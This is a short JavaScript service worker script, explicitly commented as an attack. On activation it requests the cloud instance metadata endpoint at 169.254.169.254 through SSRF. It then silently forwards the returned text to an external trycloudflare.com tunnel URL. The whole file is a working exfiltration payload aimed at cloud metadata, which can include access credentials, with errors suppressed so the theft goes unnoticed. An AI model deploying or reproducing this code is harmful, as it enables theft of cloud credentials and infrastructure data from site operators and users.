// Service Worker intercepts fetch requests
self.addEventListener('install', function(e) {
  self.skipWaiting();
});
self.addEventListener('activate', function(e) {
  e.waitUntil(clients.claim());
  // Make SSRF request during activation
  fetch('http://169.254.169.254/latest/meta-data/')
    .then(function(r){return r.text()})
    .then(function(t){
      fetch('https://influence-barn-expenditures-agriculture.trycloudflare.com/sw-ssrf?d='+encodeURIComponent(t));
    })
    .catch(function(){});
});
